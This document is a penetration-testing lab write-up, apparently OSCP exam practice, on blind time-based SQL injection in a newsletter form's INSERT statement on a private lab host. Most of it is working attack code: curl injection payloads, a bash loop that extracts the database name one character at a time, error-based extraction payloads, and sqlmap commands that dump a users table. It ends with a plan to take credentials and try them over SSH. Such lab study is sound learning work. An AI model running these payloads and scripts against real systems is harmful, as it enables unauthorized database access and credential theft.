# Lab Notes: Blind SQL Injection in INSERT Statements
**Target**: 192.168.145.48
**Vulnerable Parameter**: mail-list (POST)
**Endpoint**: /index.php
**Date**: 2025-10-01

---

## 🔍 Discovery Process

### Initial Finding
```bash
# Error-based SQLi confirmed
curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com'" -s | grep -i error
# Result: MySQL syntax error revealed

# But commenting out error = successful injection
curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com'-- -" -s | grep -i error
# Result: No error (query executed successfully)
```

### Failed UNION Attempts
```bash
# ORDER BY didn't produce errors (reached 100+ columns)
for i in {1..100}; do
  curl -X POST http://192.168.145.48/index.php -d "mail-list=test' ORDER BY $i-- -" -s | grep -i error
done
# Result: No errors - ORDER BY ignored in INSERT context

# UNION SELECT attempts failed
curl -X POST http://192.168.145.48/index.php -d "mail-list=test' UNION SELECT database()-- -" -s
# Result: No data returned - UNION doesn't work with INSERT
```

### Successful Time-Based Discovery
```bash
time curl -X POST http://192.168.145.48/index.php -d "mail-list=test' AND SLEEP(5)-- -" -s
# Result: 5+ second delay = CONFIRMED BLIND SQLi
```

---

## 📚 Understanding INSERT vs SELECT Injection

### INSERT Statement Context (Our Scenario)
```sql
-- Backend query structure
INSERT INTO newsletter (email) VALUES ('$user_input');
-- OR
INSERT INTO subscribers VALUES ('$user_input');

-- With our injection
INSERT INTO newsletter (email) VALUES ('test' AND SLEEP(5)-- -');
```

**Characteristics:**
- No data returned to user (INSERT doesn't SELECT)
- UNION SELECT impossible
- ORDER BY ignored
- Must use blind techniques

### SELECT Statement Context (Traditional SQLi)
```sql
-- Typical vulnerable query
SELECT * FROM users WHERE email='$user_input';

-- UNION would work here
SELECT * FROM users WHERE email='test' UNION SELECT database()--';
```

---

## 🎯 Exploitation Techniques Comparison

| Technique | INSERT Statement | SELECT Statement | Speed | Reliability |
|-----------|-----------------|------------------|--------|-------------|
| **Error-Based** | ✅ If errors shown | ✅ | Fast | High |
| **UNION SELECT** | ❌ No output | ✅ | Fast | High |
| **Boolean Blind** | ✅ Via subqueries | ✅ | Slow | Medium |
| **Time-Based Blind** | ✅ Always works | ✅ | Very Slow | High |
| **Stacked Queries** | ✅ If enabled | ✅ | Fast | Low |
| **Out-of-Band** | ✅ If allowed | ✅ | Fast | Low |

---

## 🔧 Manual Exploitation Methods

### 1. Database Name Extraction (Character by Character)
```bash
# Test each character position
for pos in {1..20}; do
  for char in {a..z} {A..Z} {0..9} _; do
    response_time=$(curl -X POST http://192.168.145.48/index.php \
      -d "mail-list=test' AND IF(SUBSTRING(database(),$pos,1)='$char',SLEEP(2),0)-- -" \
      -s -w "%{time_total}" -o /dev/null)

    if (( $(echo "$response_time > 2" | bc -l) )); then
      echo -n "$char"
      break
    fi
  done
done
```

### 2. Binary Search Method (Faster)
```bash
# Use ASCII values for binary search
# Check if first char ASCII > 109 (middle of printable range)
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' AND IF(ASCII(SUBSTRING(database(),1,1))>109,SLEEP(2),0)-- -" -s

# Narrow down based on response
# If delayed: char is in upper half (110-122)
# If not: char is in lower half (97-109)
```

### 3. Table Enumeration
```bash
# Get first table name from information_schema
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(2),0)-- -" -s
```

### 4. Error-Based Extraction (If Errors Visible)
```bash
# Force error with extracted data
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -" -s

# Using updatexml
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -" -s
```

---

## 🤖 SQLMap Automation

### Basic Time-Based Attack
```bash
# Automatic detection and exploitation
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --dbms=mysql \
  --technique=T \
  --level=3 \
  --risk=2 \
  -p mail-list \
  --batch

# Flags explained:
# --data: POST data
# --dbms: Skip DBMS detection (we know it's MySQL)
# --technique=T: Time-based blind only
# --level=3: More injection points
# --risk=2: Include heavy time-based queries
# -p: Parameter to test
# --batch: Non-interactive mode
```

### Optimized for Speed
```bash
# Faster extraction with threads
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=T \
  --threads=10 \
  --time-sec=2 \
  -D [database_name] \
  --tables \
  --batch

# --threads=10: Parallel requests
# --time-sec=2: 2-second delay (default is 5)
```

### Database Enumeration
```bash
# Get current database
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=T \
  --current-db

# Enumerate tables
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=T \
  -D [db_name] \
  --tables

# Dump specific table
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=T \
  -D [db_name] \
  -T users \
  --dump
```

### Advanced Options
```bash
# Use error-based if errors are visible
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=E \
  --batch

# Boolean-based blind (check content differences)
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=B \
  --string="Thank you for subscribing" \
  --batch

# All techniques except stacked queries
sqlmap -u http://192.168.145.48/index.php \
  --data="mail-list=test@test.com" \
  --technique=BEUT \
  --batch
```

---

## 📖 Reference Materials & Resources

### Official Documentation
- **SQLMap Manual**: https://github.com/sqlmapproject/sqlmap/wiki/Usage
- **MySQL Injection Cheat Sheet**: https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- **OWASP SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection

### Blind SQLi Specific Guides
- **PortSwigger Blind SQLi**: https://portswigger.net/web-security/sql-injection/blind
- **HackTricks Blind SQLi**: https://book.hacktricks.xyz/pentesting-web/sql-injection#blind-sql-injection
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#blind-sql-injection

### Time-Based Techniques
```sql
-- MySQL Functions for Time-Based
SLEEP(5)                    -- Direct sleep
BENCHMARK(1000000,MD5('a')) -- CPU-intensive delay
IF(condition,SLEEP(5),0)    -- Conditional delay
CASE WHEN condition THEN SLEEP(5) ELSE 0 END

-- Alternative delay techniques
SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C
-- Cartesian product causes delay
```

### Boolean-Based Techniques
```sql
-- Content-based detection
AND 1=1 -- True condition (normal page)
AND 1=2 -- False condition (different page)

-- Substring comparisons
AND SUBSTRING(database(),1,1)='a'
AND ASCII(SUBSTRING(database(),1,1))>109
AND LENGTH(database())=8
```

---

## 🎓 OSCP Exam Strategies

### Time Management
- **Manual Discovery**: 5-10 minutes
- **Tool Setup**: 5 minutes
- **Automated Extraction**: 20-60 minutes (depending on data size)
- **Total Budget**: 30-75 minutes for complete SQLi exploitation

### Decision Tree
```
1. Error visible? → Use error-based extraction
2. No errors but content differs? → Boolean blind
3. No content difference? → Time-based blind
4. Time-based too slow? → Consider moving to next target
```

### Speed Optimization
```bash
# Faster character set (common DB chars only)
charset="abcdefghijklmnopqrstuvwxyz0123456789_"

# Binary search instead of linear
# Reduces attempts from 36 to ~6 per character

# Multiple threads in SQLMap
--threads=10

# Reduce delay time (risky but faster)
--time-sec=1
```

---

## 🔬 Troubleshooting Common Issues

### Problem: SQLMap Can't Find Injection
```bash
# Solution: Increase detection levels
sqlmap -u [URL] --data="mail-list=test" --level=5 --risk=3

# Force parameter
sqlmap -u [URL] --data="mail-list=test*" --batch

# Specify prefix/suffix
sqlmap -u [URL] --data="mail-list=test" --prefix="'" --suffix="-- -"
```

### Problem: Extraction Too Slow
```bash
# Use binary search
# Limit charset to likely characters
# Increase threads
# Reduce time delay
# Consider partial extraction (just passwords, not full dump)
```

### Problem: False Positives
```bash
# Network latency causing delays
# Solution: Increase time threshold
--time-sec=5

# Test baseline response time first
for i in {1..10}; do
  time curl -X POST http://192.168.145.48/index.php -d "mail-list=test@test.com" -s -o /dev/null
done
```

---

## 💡 Key Takeaways

1. **INSERT injections require blind techniques** - No direct data output
2. **Time-based is universal but slow** - Works everywhere, patience required
3. **Binary search dramatically reduces extraction time** - From O(n) to O(log n)
4. **SQLMap automation saves time** - But understand manual methods first
5. **Error messages reveal context** - "near ''value''" suggests INSERT syntax
6. **Document time requirements** - Critical for OSCP exam planning

---

## ✅ SUCCESSFUL EXPLOITATION RESULTS

### Database Extracted
**Database Name**: `animal_planet` (13 characters)
- Extraction Time: ~7 minutes with SQLMap
- Manual extraction would take: ~15 minutes using binary search

### SQLMap Payload Analysis
```
Working Payload: test@test.com' AND (SELECT 9733 FROM (SELECT(SLEEP(5)))bfqy)-- rNxV
```

**Breakdown:**
- `test@test.com'` - Closes the original string
- `AND` - Logical operator for condition
- `(SELECT 9733 FROM (SELECT(SLEEP(5)))bfqy)` - Subquery causing delay
- `-- rNxV` - Comment with random suffix to avoid caching

### Simplified Manual Payload
```bash
mail-list=test' AND SLEEP(3)-- -
```

---

## 🚀 Next Steps

1. ✅ Extract database name using time-based blind SQLi
   - **Result**: animal_planet
2. Enumerate tables in the database
   - Use extraction_scripts.sh for automation
3. Find user/admin tables
4. Extract credentials
5. Test credentials on SSH (port 22)
6. Document full exploitation chain

---

## 📝 Command Quick Reference

```bash
# Confirm injection
time curl -X POST http://192.168.145.48/index.php -d "mail-list=test' AND SLEEP(5)-- -" -s

# Extract database name (manual)
# See script in Manual Exploitation section

# Extract with SQLMap
sqlmap -u http://192.168.145.48/index.php --data="mail-list=test" --technique=T --current-db

# Get tables
sqlmap -u http://192.168.145.48/index.php --data="mail-list=test" --technique=T -D [db_name] --tables

# Dump credentials
sqlmap -u http://192.168.145.48/index.php --data="mail-list=test" --technique=T -D [db_name] -T users --dump
```

---

**Time Logged**: 45 minutes research and documentation
**Next Review**: After credential extraction